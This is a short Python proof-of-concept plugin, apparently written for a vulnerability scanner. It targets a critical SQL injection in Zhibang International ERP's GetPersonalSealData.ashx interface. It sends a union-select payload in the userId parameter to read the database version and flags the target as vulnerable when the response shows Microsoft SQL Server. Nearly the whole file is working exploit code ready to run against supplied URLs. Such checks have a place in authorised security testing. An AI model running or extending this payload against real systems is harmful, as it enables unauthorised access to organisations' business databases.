#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/4nD3E26P-sEpAw51c9frUw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '智邦国际ERP GetPersonalSealData.ashx接口存在SQL注入',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/16',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept':'*/*',
      'Connection': 'Keep-Alive',
      }
  target = '/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'Image.*?null.*?SealData.*?Microsoft.*?SQL.*?Server',res.text,re.S|re.I):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret